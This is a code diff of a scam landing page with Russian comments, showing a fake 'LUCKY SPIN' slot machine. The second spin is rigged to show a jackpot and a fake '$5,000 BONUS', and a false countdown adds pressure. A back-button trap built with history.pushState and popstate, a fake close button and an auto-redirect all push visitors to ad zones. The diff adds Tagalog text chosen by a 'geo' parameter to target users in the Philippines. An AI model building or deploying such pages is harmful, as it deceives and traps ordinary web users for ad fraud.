@@ -1,5 +1,5 @@
 <!doctype html>
-<html data-version="0.0.133" data-landing-name="clickbox" data-env="production-archive" lang="">
+<html data-version="0.0.134" data-landing-name="clickbox" data-env="production-archive" lang="">
 
 <head>
     <script>
@@ -18,7 +18,7 @@
     </script>
 
     <script>
-    // Глобальная функция для "Обратного" выхода (Кнопка Назад или Крестик)
+    // Глобальная функция для "Обратного" выхода
     function performReverseExit() {
         if (APP_CONFIG.reverse_zoneId) {
             const domain = APP_CONFIG.domain; 
@@ -41,17 +41,15 @@
             isTrapArmed = true;
 
             try {
-                // Заряжаем историю
                 window.history.pushState({page: 1}, document.title, window.location.href);
             } catch (e) {
                 isTrapArmed = false;
                 return;
             }
 
-            // Включаем слушатель с задержкой 1 сек (защита от багов на старых Android)
             setTimeout(function() {
                 window.addEventListener('popstate', function(event) {
-                    performReverseExit(); // Вызываем ту же функцию, что и крестик
+                    performReverseExit();
                 });
             }, 1000);
         }
@@ -83,23 +81,13 @@
 
     <style>
         body {
-            /* !!! НАСТРОЙКА ФОНА !!! */
             background-image: url('./assets/images/background.jpg'); 
             background-color: #000; 
             background-size: cover; 
             background-position: center; 
             background-repeat: no-repeat;
-            
-            margin: 0; 
-            overflow: hidden; 
-            color: #fff; 
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
+            margin: 0; overflow: hidden; color: #fff; font-family: Arial, sans-serif; height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
         }
 
         /* Скрываем элементы СТАРОЙ игры */
@@ -107,38 +95,22 @@
             opacity: 0 !important; pointer-events: none !important; position: absolute !important; z-index: -9999 !important; width: 1px !important; height: 1px !important;
         }
 
-        /* --- НОВЫЙ СТИЛЬ ДЛЯ КНОПКИ ЗАКРЫТЬ --- */
         .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            width: 30px;
-            height: 30px;
-            line-height: 28px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            color: rgba(255, 255, 255, 0.7);
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 50%;
-            cursor: pointer;
-            z-index: 1000;
-            user-select: none;
-            transition: all 0.2s;
+            position: absolute; top: 15px; right: 15px; width: 30px; height: 30px;
+            line-height: 28px; text-align: center; font-size: 24px; font-weight: bold;
+            color: rgba(255, 255, 255, 0.7); background: rgba(0, 0, 0, 0.3); border-radius: 50%;
+            cursor: pointer; z-index: 1000; user-select: none; transition: all 0.2s;
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
-        .close-btn:hover {
-            color: #fff;
-            background: rgba(0, 0, 0, 0.6);
-        }
-        .close-btn:active {
-            transform: scale(0.9);
-        }
+        .close-btn:hover { color: #fff; background: rgba(0, 0, 0, 0.6); }
+        .close-btn:active { transform: scale(0.9); }
 
         .casino-container { width: 100%; max-width: 450px; text-align: center; position: relative; z-index: 10; }
 
         .logo-area h1 {
-            font-size: 2.5rem; color: #ffd700; margin: 0 0 10px 0; text-transform: uppercase;
+            /* УВЕЛИЧЕН РАЗМЕР ШРИФТА */
+            font-size: 3.8rem; 
+            color: #ffd700; margin: 0 0 10px 0; text-transform: uppercase;
             text-shadow: 0 0 10px #ff00de, 0 0 20px #ff00de; animation: pulse-logo 2s infinite;
         }
 
@@ -264,7 +236,7 @@
 
     <div class="casino-container">
         <div class="logo-area">
-            <h1>LUCKY SPIN</h1>
+            <h1 id="titleText">LUCKY SPIN</h1>
         </div>
 
         <div class="timer-text" id="timerText">HURRY UP! BONUS EXPIRES IN:</div>
@@ -276,68 +248,21 @@
             <div class="slot-window">
                 <div class="payline"></div>
                 <div class="reel" id="reel1">
+                    <img src="./assets/images/phone.webp"><br><img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br><img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br>
                     <img src="./assets/images/phone.webp"><br>
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    <img src="./assets/images/phone.webp"><br>
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    
-                    <img src="./assets/images/phone.webp"><br>
-                    
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    
+                    <img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br>
                     <img src="./assets/images/money.webp">
                 </div>
-                
                 <div class="reel" id="reel2">
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
+                    <img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br><img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br>
                     <img src="./assets/images/phone.webp"><br>
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    <img src="./assets/images/phone.webp"><br>
-                    
-                    <img src="./assets/images/phone.webp"><br>
-                    
-                    <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    
+                    <img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br>
                     <img src="./assets/images/money.webp">
                 </div>
-                
                 <div class="reel" id="reel3">
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    <img src="./assets/images/phone.webp"><br>
+                    <img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br><img src="./assets/images/money.webp"><br><img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br><img src="./assets/images/money.webp"><br>
                     <img src="./assets/images/money.webp"><br>
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    <img src="./assets/images/phone.webp"><br>
-                    <img src="./assets/images/money.webp"><br>
-                    
-                    <img src="./assets/images/money.webp"><br>
-                    
-                    <img src="./assets/images/girl.webp"><br>
-                    <img src="./assets/images/laptop.webp"><br>
-                    <img src="./assets/images/gift.webp"><br>
-                    <img src="./assets/images/phone.webp"><br>
-                    
+                    <img src="./assets/images/girl.webp"><br><img src="./assets/images/laptop.webp"><br><img src="./assets/images/gift.webp"><br><img src="./assets/images/phone.webp"><br>
                     <img src="./assets/images/money.webp">
                 </div>
             </div>
@@ -347,8 +272,8 @@
 
     <div class="winner-modal" id="winModal">
         <div class="winner-content">
-            <h2>JACKPOT!</h2>
-            <p>You matched 3 Money Bags!</p>
+            <h2 id="winTitle">JACKPOT!</h2>
+            <p id="winSub">You matched 3 Money Bags!</p>
             
             <div class="win-icons-row">
                 <img src="./assets/images/money.webp" alt="Win">
@@ -356,13 +281,57 @@
                 <img src="./assets/images/money.webp" alt="Win">
             </div>
 
-            <p>You have won <b style="color: #d32f2f; font-size: 22px;">$5,000 BONUS</b>.</p>
+            <p id="winBody">You have won <b style="color: #d32f2f; font-size: 22px;">$5,000 BONUS</b>.</p>
             <button class="claim-btn" id="claimBtn">CLAIM REWARD</button>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // --- ЛОГИКА ПЕРЕВОДОВ (НОВОЕ) ---
+            const translations = {
+                en: {
+                    title: "LUCKY SPIN",
+                    timer: "HURRY UP! BONUS EXPIRES IN:",
+                    spinBtn: "SPIN NOW",
+                    spinning: "SPINNING...",
+                    spinAgain: "SPIN AGAIN!",
+                    jackpot: "JACKPOT!",
+                    match: "You matched 3 Money Bags!",
+                    won: "You have won <b style='color: #d32f2f; font-size: 22px;'>$5,000 BONUS</b>.",
+                    claim: "CLAIM REWARD"
+                },
+                ph: { // ФИЛИППИНЫ (TAGALOG)
+                    title: "MASWERTENG SPIN",
+                    timer: "BILISAN! MATATAPOS ANG BONUS SA:",
+                    spinBtn: "IKOT NA",
+                    spinning: "UMIIKOT...",
+                    spinAgain: "IKOT ULIT!",
+                    jackpot: "JACKPOT!",
+                    match: "Tumugma ang 3 Supot ng Pera!",
+                    won: "Nanalo ka ng <b style='color: #d32f2f; font-size: 22px;'>$5,000 BONUS</b>.",
+                    claim: "KUNIN ANG PREMYO"
+                }
+            };
+
+            // Определяем язык
+            const urlParams = new URLSearchParams(window.location.search);
+            const geo = urlParams.get('geo') || 'EN'; // Если нет гео, будет английский
+            const lang = (geo.toUpperCase() === 'PH' || geo.toUpperCase() === 'PHILIPPINES') ? 'ph' : 'en';
+            
+            // Получаем нужный словарь
+            const t = translations[lang];
+
+            // Применяем переводы при загрузке
+            document.getElementById('titleText').innerText = t.title;
+            document.getElementById('timerText').innerText = t.timer;
+            document.getElementById('spinBtn').innerText = t.spinBtn;
+            document.getElementById('winTitle').innerText = t.jackpot;
+            document.getElementById('winSub').innerText = t.match;
+            document.getElementById('winBody').innerHTML = t.won;
+            document.getElementById('claimBtn').innerText = t.claim;
+
+            // --- ОСНОВНАЯ ЛОГИКА ---
             const spinBtn = document.getElementById('spinBtn');
             const claimBtn = document.getElementById('claimBtn');
             const winModal = document.getElementById('winModal');
@@ -373,20 +342,16 @@
             const reels = [document.getElementById('reel1'), document.getElementById('reel2'), document.getElementById('reel3')];
             const iconHeight = 150; 
             
-            // !!! ЗВУК !!!
-            // Убедитесь, что файл существует по пути: ./assets/sounds/win.mp3
             const winSound = new Audio('./assets/sounds/win.mp3');
             
             let spinCount = 0; 
             let autoExitTimer = null; 
 
-            // --- ФУНКЦИЯ ВЫХОДА ---
             async function performMainExit(isClick = false) {
                 const domain = APP_CONFIG.domain; 
                 const zoneId = isClick ? APP_CONFIG.mainExit_newTab_zoneId : APP_CONFIG.mainExit_currentTab_zoneId;
 
                 if(!zoneId) { 
-                    console.error("Zone ID missed");
                     window.location.href = "https://google.com"; 
                     return; 
                 }
@@ -405,13 +370,14 @@
                 }
             }
 
-            // --- НАЖАТИЕ SPIN ---
             spinBtn.addEventListener('click', function() {
                 if(spinBtn.disabled) return; 
                 
                 if(navigator.vibrate) navigator.vibrate(100);
                 spinBtn.disabled = true; 
-                spinBtn.innerText = "SPINNING...";
+                
+                // Используем текст из словаря для кнопки
+                spinBtn.innerText = t.spinning; 
 
                 let targetIndex = 0;
                 
@@ -429,19 +395,16 @@
 
                     setTimeout(() => {
                         spinBtn.disabled = false;
-                        spinBtn.innerText = "SPIN AGAIN!";
+                        // Используем текст из словаря для кнопки
+                        spinBtn.innerText = t.spinAgain;
                     }, 4000); 
 
                 } else {
-                    // --- ВТОРОЙ СПИН (WIN) ---
                     targetIndex = 15;
-                    
                     if(autoExitTimer) clearTimeout(autoExitTimer);
                     
                     setTimeout(() => { 
                         winModal.classList.add('show'); 
-                        
-                        // !!! ИГРАЕМ ЗВУК !!!
                         winSound.play().catch(e => console.log("Sound error:", e));
 
                         console.log("Jackpot shown. Auto-redirect in 10s...");
